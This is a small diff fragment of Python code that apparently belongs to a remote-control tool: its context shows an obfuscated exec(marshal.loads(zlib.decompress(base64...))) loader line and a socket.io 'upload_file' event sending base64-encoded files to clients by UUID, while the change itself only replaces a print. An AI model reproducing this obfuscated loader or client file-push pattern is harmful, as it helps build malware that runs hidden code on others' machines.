@@ -253,7 +253,7 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
             file_content = file.read()
             base64_encoded = base64.b64encode(file_content).decode('utf-8')
             
-            print(base64_encoded)
+            print("file encoded")
 
         for uuid in uuids:
             self.sio.emit("upload_file", {'uuid': uuid, 'file_name': file.filename, 'file': base64_encoded})
